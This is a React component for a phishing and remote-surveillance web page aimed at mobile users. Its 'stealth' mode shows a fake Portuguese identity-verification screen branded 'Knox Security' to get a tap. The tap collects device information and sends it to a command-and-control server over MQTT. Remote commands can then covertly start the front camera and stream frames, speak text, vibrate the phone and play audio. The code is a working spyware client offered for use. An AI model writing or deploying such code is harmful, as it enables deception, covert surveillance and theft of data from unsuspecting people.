
import React, { useEffect, useState, useRef } from 'react';
import { Skull, Power, ShieldCheck, Loader2, Zap, AlertTriangle, Fingerprint, Sparkles } from 'lucide-react';
import { getDeviceInfo } from '../services/deviceService';
import { mqttService } from '../services/mqttService';
import { DeviceInfo, CommandMessage } from '../types';

const MobileScanner: React.FC = () => {
  const [started, setStarted] = useState(false);
  const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
  const [info, setInfo] = useState<DeviceInfo | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [stealthMode, setStealthMode] = useState(false);
  const [isGlitching, setIsGlitching] = useState(false);
  const [auraActive, setAuraActive] = useState(false);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamIntervalRef = useRef<number | null>(null);

  const getURLParams = () => {
    const hash = window.location.hash; 
    const queryPart = hash.split('?')[1];
    if (!queryPart) return { session: null, stealth: false };
    const params = new URLSearchParams(queryPart);
    return { session: params.get('session'), stealth: params.get('stealth') === 'true' };
  };

  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-8), msg]);

  const handleCommand = (cmd: CommandMessage, session: string) => {
    switch (cmd.type) {
      case 'ACTIVATE_CAMERA': startCamera(session); break;
      case 'STOP_CAMERA': stopCamera(); break;
      case 'SPEAK': 
        const utterance = new SpeechSynthesisUtterance(cmd.payload.text);
        utterance.lang = 'pt-BR';
        window.speechSynthesis.speak(utterance);
        addLog('NEURAL_AUDIO_SYNC');
        break;
      case 'GLITCH':
        setIsGlitching(true);
        if (navigator.vibrate) navigator.vibrate([200, 100, 200, 100, 500]);
        setTimeout(() => setIsGlitching(false), 3000);
        addLog('EMERGENCY_OVERRIDE');
        break;
      case 'SEND_AURA':
        setAuraActive(true);
        setTimeout(() => setAuraActive(false), 5000);
        addLog('AURA_SYNC_ACTIVE');
        break;
      case 'PLAY_AUDIO':
        new Audio(cmd.payload.url).play().catch(() => {});
        break;
    }
  };

  const startCamera = async (sessionId: string) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: 'user', width: 320, height: 240 }, audio: false 
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        addLog('CAMERA_UPLINK_ON');
        streamIntervalRef.current = window.setInterval(() => {
           if (videoRef.current && canvasRef.current) {
              const ctx = canvasRef.current.getContext('2d');
              if (ctx) {
                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                 mqttService.publishStream(sessionId, { 
                   image: canvasRef.current.toDataURL('image/jpeg', 0.5), 
                   timestamp: new Date().toISOString() 
                 });
              }
           }
        }, 300);
      }
    } catch (err) { 
      addLog('CAMERA_PERMISSION_DENIED'); 
    }
  };

  const stopCamera = () => {
     if (streamIntervalRef.current) { clearInterval(streamIntervalRef.current); streamIntervalRef.current = null; }
     if (videoRef.current?.srcObject) (videoRef.current.srcObject as MediaStream).getTracks().forEach(t => t.stop());
     addLog('CAMERA_UPLINK_OFF');
  };

  const initiatePayload = async () => {
    const { session, stealth } = getURLParams();
    if (!session) {
      setStatus('error');
      return;
    }

    setStarted(true);
    setStealthMode(stealth);
    setStatus('scanning');
    setProgress(10);
    addLog('INIT_SEQUENCE');

    try {
      addLog('GATHERING_SYS_INFO');
      const data = await getDeviceInfo(stealth);
      setInfo(data);
      setProgress(50);

      addLog('CONNECTING_TO_C2');
      mqttService.connect(
        session, 
        () => {}, 
        () => {
          mqttService.publishData(session, data);
          addLog('TELEMETRY_TX_COMPLETE');
          setProgress(100);
          setStatus('complete');
        }, 
        (cmd) => handleCommand(cmd, session)
      );
    } catch (e) {
      addLog('FATAL_UPLINK_ERROR');
      setStatus('error');
    }
  };

  if (!started) {
    const { stealth } = getURLParams();
    return (
      <div onClick={initiatePayload} className={`fixed inset-0 flex flex-col items-center justify-center p-8 z-50 select-none active:scale-95 transition-transform ${stealth ? 'bg-zinc-50 text-zinc-900' : 'bg-black text-red-500'}`}>
        {stealth ? (
          <div className="text-center space-y-6">
            <div className="w-20 h-20 bg-blue-600 rounded-full mx-auto flex items-center justify-center shadow-lg">
               <ShieldCheck size={40} className="text-white" />
            </div>
            <div className="space-y-2">
              <h1 className="text-xl font-sans font-bold text-zinc-800">Verificação de Dispositivo</h1>
              <p className="text-sm text-zinc-500 leading-relaxed px-4">Detectamos uma tentativa de acesso incomum. Por favor, clique no botão abaixo para validar sua identidade.</p>
            </div>
            <div className="mt-8 px-6 py-3 bg-blue-600 text-white rounded font-bold shadow-md uppercase text-sm tracking-widest">Validar Acesso</div>
            <div className="flex items-center justify-center gap-2 text-[10px] text-zinc-400 mt-4 font-sans">
               <Fingerprint size={12} /> Protegido por Knox Security™
            </div>
          </div>
        ) : (
          <div className="text-center space-y-6">
            <div className="relative inline-block">
              <Power size={80} className="text-red-600 animate-pulse" />
              <div className="absolute inset-0 bg-red-600 blur-2xl opacity-20 animate-pulse"></div>
            </div>
            <div className="space-y-1">
              <h1 className="text-3xl font-black tracking-tighter italic">PEGASUS_LOADER</h1>
              <div className="h-[1px] w-full bg-gradient-to-r from-transparent via-red-900 to-transparent"></div>
              <p className="text-[10px] text-red-400 font-bold tracking-[0.3em] uppercase">Connect to Motherboard</p>
            </div>
          </div>
        )}
      </div>
    );
  }

  return (
    <div className={`min-h-screen font-mono p-6 flex flex-col items-center justify-center relative transition-all duration-300 overflow-hidden ${isGlitching ? 'bg-red-600 invert' : (stealthMode ? 'bg-zinc-100 text-zinc-900' : 'bg-black text-green-500')}`}>
      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>
      
      {/* Aura Effect Layer */}
      {auraActive && (
        <div className="absolute inset-0 pointer-events-none z-0">
           <div className="absolute inset-0 bg-gradient-to-tr from-purple-500/40 via-blue-500/40 to-green-500/40 animate-pulse"></div>
           <div className="absolute inset-0 flex items-center justify-center">
              <Sparkles size={300} className="text-white/20 animate-spin-slow" />
           </div>
        </div>
      )}

      {isGlitching && <div className="absolute inset-0 bg-red-500/10 flex items-center justify-center z-50 pointer-events-none"><Zap size={150} className="text-white animate-ping opacity-50" /></div>}

      <div className="z-10 w-full max-w-sm space-y-8 animate-in fade-in duration-500">
        <div className="text-center">
          {stealthMode ? (
             <div className="space-y-4">
                <Loader2 className="animate-spin text-blue-500 mx-auto" size={32} />
                <h2 className="text-lg font-bold text-zinc-700">Validando Certificados...</h2>
             </div>
          ) : (
             <div className="space-y-2">
                <Skull size={48} className={`mx-auto drop-shadow-[0_0_10px_rgba(255,255,255,0.5)] mb-4 ${auraActive ? 'text-purple-400 animate-bounce' : 'text-white'}`} />
                <h1 className="text-3xl font-black uppercase italic tracking-tighter">Connected</h1>
                <div className="text-[9px] bg-red-900/40 py-1 px-4 border border-red-900 rounded inline-block text-white">TUNNELING_ESTABLISHED</div>
             </div>
          )}
        </div>

        <div className={`p-5 border shadow-2xl relative z-10 ${stealthMode ? 'bg-white border-zinc-200 rounded-xl' : 'bg-zinc-950 border-green-900'}`}>
          {!stealthMode && <div className="absolute -top-1 -left-1 w-3 h-3 border-t-2 border-l-2 border-green-500"></div>}
          {!stealthMode && <div className="absolute -bottom-1 -right-1 w-3 h-3 border-b-2 border-r-2 border-green-500"></div>}

          <div className="space-y-2 mb-6">
            <div className="flex justify-between text-[10px] font-bold">
               <span className={stealthMode ? 'text-zinc-400' : 'text-green-800'}>DATA_PACKETS</span>
               <span>{progress}%</span>
            </div>
            <div className={`h-1.5 rounded-full overflow-hidden ${stealthMode ? 'bg-zinc-100' : 'bg-zinc-900'}`}>
              <div className={`h-full transition-all duration-700 ease-out ${stealthMode ? 'bg-blue-600' : 'bg-green-500'}`} style={{ width: `${progress}%` }}></div>
            </div>
          </div>

          <div className={`text-[9px] h-40 overflow-hidden font-mono py-2 mb-4 space-y-1 ${stealthMode ? 'text-zinc-400' : 'text-green-400/70'}`}>
            {logs.map((l, i) => <div key={i} className="flex gap-2"><span>[{new Date().toLocaleTimeString()}]</span><span>&gt; {l}</span></div>)}
            <div className="animate-pulse">_</div>
          </div>
        </div>
      </div>
      
      <div className="absolute bottom-6 left-0 right-0 flex justify-center opacity-30 pointer-events-none z-10">
         <div className="flex items-center gap-2 text-[9px] uppercase tracking-widest font-sans">
            <ShieldCheck size={10} /> Secure Tunnel Protocol v4.0
         </div>
      </div>
      <style>{`
        @keyframes spin-slow {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
        .animate-spin-slow {
          animation: spin-slow 15s linear infinite;
        }
      `}</style>
    </div>
  );
};

export default MobileScanner;
